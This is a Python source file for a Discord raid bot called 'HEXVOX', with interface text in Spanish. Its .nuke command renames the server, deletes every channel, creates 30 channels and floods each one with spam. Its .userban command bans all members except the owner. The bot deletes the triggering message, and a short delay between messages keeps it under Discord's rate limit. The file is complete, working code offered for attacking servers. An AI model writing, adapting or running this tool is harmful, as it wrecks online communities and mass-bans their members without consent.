import asyncio
import os
import sys
import aiohttp
import discord
from discord.ext import commands

config = {
    "token": "",
    "server_name": "",
    "channel_name": "",
    "spam_message": "",
    "icon_url": ""
}

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True
intents.members = True 
bot = commands.Bot(command_prefix=".", intents=intents)

RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
RESET = "\033[0m"

def clear_screen():
    os.system('clear')
    print(f"{RED}==================================================")
    print(f"       ⚡ HEXVOX PENAL TERMINAL SYSTEM ⚡        ")
    print(f"=================================================={RESET}")

async def change_server_icon(guild, url):
    if not url: 
        return
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    await guild.edit(icon=await resp.read())
                    print(f"{GREEN}[+] Icono del servidor modificado.{RESET}")
    except Exception as e:
        print(f"{RED}[-] Error al cambiar el icono del servidor: {e}{RESET}")

async def run_nuke(ctx):
    guild = ctx.guild
    print(f"\n{RED}[!] ATACANDO SERVIDOR: {guild.name.upper()}{RESET}")
    
    try: 
        await guild.edit(name=config["server_name"])
        print(f"{GREEN}[+] Nombre del servidor cambiado a: {config['server_name']}{RESET}")
    except: 
        print(f"{RED}[-] No se pudo cambiar el nombre del servidor (Falta de permisos).{RESET}")

    print(f"{YELLOW}[*] Eliminando todos los canales existentes...{RESET}")
    await asyncio.gather(*[ch.delete() for ch in guild.channels], return_exceptions=True)
    
    if config["icon_url"]:
        asyncio.create_task(change_server_icon(guild, config["icon_url"]))
    
    print(f"{YELLOW}[*] Creando canales de inundación...{RESET}")
    created_channels = []
    for _ in range(30):
        try:
            ch = await guild.create_text_channel(name=config["channel_name"])
            created_channels.append(ch)
        except: 
            pass
            
    async def send_spam(channel):
        for _ in range(50):
            try:
                await channel.send(config["spam_message"])
                await asyncio.sleep(0.15) # Margen de seguridad anti-rate-limit
            except: 
                break

    print(f"{GREEN}[+] Inyectando mensajes de spam...{RESET}")
    await asyncio.gather(*[send_spam(ch) for ch in created_channels])
    print(f"{GREEN}[✔] Ejecución de comando .nuke finalizada.{RESET}\n")

@bot.event
async def on_ready():
    # Mensaje de éxito al conectar el bot
    print(f"\n{GREEN}[✔] CONECTADO COMO: {bot.user.name.upper()} bot{RESET}")
    print(f"{YELLOW}Usa el comando .nuke en el servidor para empezar{RESET}\n")
    print(f"{BLUE}Para detener la sesión en Termux, presiona: Ctrl + C{RESET}")

@bot.command(name="nuke")
async def nuke_command(ctx):
    try: 
        await ctx.message.delete()
    except: 
        pass
    await run_nuke(ctx)

@bot.command(name="userban")
async def userban_command(ctx):
    try: 
        await ctx.message.delete()
    except: 
        pass
    print(f"{RED}[!] Aplicando ban general de usuarios...{RESET}")
    tasks = [ctx.guild.ban(m, reason="Hexvox Raid") for m in ctx.guild.members if m != bot.user and m != ctx.guild.owner]
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"{GREEN}[✔] Ban masivo finalizado.{RESET}")

def main():
    clear_screen()
    
    token = input(f"{GREEN}➔ Coloca el token del bot: {RESET}").strip()
    if not token:
        print(f"{RED}[❌] Error: El token no puede estar vacío.{RESET}")
        sys.exit()

    server = input(f"{GREEN}➔ ¿Qué nombre nuevo para el servidor?: {RESET}").strip()
    if not server:
        print(f"{RED}[❌] Error: Debes definir un nombre para el servidor.{RESET}")
        sys.exit()
    config["server_name"] = server

    channel = input(f"{GREEN}➔ ¿Qué nombre nuevo para el canal?: {RESET}").strip()
    if not channel:
        print(f"{RED}[❌] Error: Debes definir un nombre para los canales.{RESET}")
        sys.exit()
    config["channel_name"] = channel

    spam = input(f"{GREEN}➔ Nombre de el mensaje de spam: {RESET}").strip()
    if not spam:
        print(f"{RED}[❌] Error: El mensaje de spam no puede estar vacío.{RESET}")
        sys.exit()
    config["spam_message"] = spam

    icon = input(f"{GREEN}➔ Coloca la imagen nueva del servidor (Opcional - Enter para saltar): {RESET}").strip()
    if icon:
        config["icon_url"] = icon

    print(f"\n{YELLOW}[*] Validando parámetros y estableciendo conexión con Discord...{RESET}")
    
    try:
        bot.run(token)
    except discord.errors.LoginFailure:
        print(f"\n{RED}[❌] ERROR: El token ingresado es incorrecto o expiró.{RESET}")
    except KeyboardInterrupt:
        print(f"\n{RED}[-] Script cerrado por el usuario.{RESET}")

if __name__ == '__main__':
    main()
